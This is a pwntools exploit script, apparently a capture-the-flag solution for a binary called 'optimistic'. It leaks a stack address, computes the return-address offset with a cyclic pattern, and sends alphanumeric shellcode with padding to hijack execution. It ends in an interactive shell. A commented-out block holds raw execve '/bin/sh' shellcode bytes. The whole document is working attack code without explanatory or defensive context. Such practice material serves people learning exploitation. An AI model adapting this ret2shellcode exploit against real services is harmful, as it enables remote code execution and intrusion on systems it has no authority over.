from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './optimistic'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

def getOffset(pattern):
    sh = process(exe)
    sh.sendlineafter(':', 'y')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', 'aa')
    sh.sendlineafter(':', '-1')
    sh.sendlineafter(':', pattern)
    sh.wait()
    offset = cyclic_find(sh.corefile.read(sh.corefile.sp,4))
    info('EIP/RIP offset : {i}'.format(i=offset))
    return offset

pattern = cyclic(1024)
offset = getOffset(pattern) # got 104

sh = start()

sh.sendlineafter(':', 'y')

# LEAK THE STACK ADDRESS
stackAddr = int(re.search(r"(0x[\w\d]+)", sh.recvlineS()).group(0), 16)
info("Stack Address Leaked: %#x", stackAddr)

## remove 96 bytes to point at RSP instead of RBP | remove 96 bytes because `local_68` buffer is 96 bytes
stackAddr -= 96


## create the shellcode - NEED PYTHON 2 ENV
##shellcode =  b""
##shellcode += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
##shellcode += b"\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00"
##shellcode += b"\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e"
##shellcode += b"\x6a\x3b\x58\x0f\x05"
##shellcode = alphanumeric(shellcode)


shellcode = "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"

## payload

p = flat(
    [
        shellcode,
        cyclic(offset - len(shellcode)), # as the padding bytes to RIP
        stackAddr # RBP - 96 (our shellcode)
    ]
)

sh.sendlineafter(':','aa')
sh.sendlineafter(':','aa')
sh.sendlineafter(':','-1')
sh.sendlineafter(':',p)

sh.interactive()
